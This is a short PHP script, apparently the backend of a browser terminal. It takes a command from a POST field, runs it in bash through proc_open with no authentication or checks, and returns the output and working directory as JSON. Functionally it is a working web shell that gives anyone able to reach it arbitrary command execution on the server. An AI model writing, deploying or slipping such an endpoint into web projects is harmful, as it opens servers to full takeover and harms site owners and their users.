<?php
//sleep(5);

function run_command($command, $pwd) {
    $descriptorspec = array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w'),
    );
    $pipes = array();
    /* Depending on the value of variables_order, $_ENV may be empty.
     * In that case, we have to explicitly set the new variables with
     * putenv, and call proc_open with env=null to inherit the reset
     * of the system.
     *
     * This is kind of crappy because we cannot easily restore just those
     * variables afterwards.
     *
     * If $_ENV is not empty, then we can just copy it and be done with it.
     */
    /*if(count($_ENV) === 0) {
        $env = NULL;
        foreach($this->envopts as $k => $v) {
            putenv(sprintf("%s=%s",$k,$v));
        }
    } else {
        $env = array_merge($_ENV, $this->envopts);
    }
    $cwd = $this->repo_path;*/

    $pwd = is_dir($pwd) ? $pwd : null;

    $resource = proc_open('bash', $descriptorspec, $pipes, $pwd, null);

    fwrite($pipes[0], $command);
    fwrite($pipes[0], "\n");
    fwrite($pipes[0], 'pwd');
    fclose($pipes[0]);


    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);

    fclose($pipes[1]);
    fclose($pipes[2]);

    $status = trim(proc_close($resource));
    if ($status) throw new Exception($stderr . "\n" . $stdout); //Not all errors are printed to stderr, so include std out as well.


    $lines = explode("\n", $stdout);

    $count = count($lines);

    $pwd = $lines[$count - 2];

    unset($lines[$count - 1]);
    unset($lines[$count - 2]);

    $res = implode(PHP_EOL, $lines);

    return array('pwd' => $pwd, 'res' => $res);
}

if (!empty($_POST['cmd'])) {
    try {
        $result = run_command($_POST['cmd'], $_POST['pwd']);
        echo json_encode([
            'status' => 'success',
            'result' => $result['res'],
            'pwd' => $result['pwd'] . PHP_EOL . '$ '
        ]);
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'result' => $e->getMessage()
        ]);
    }

}


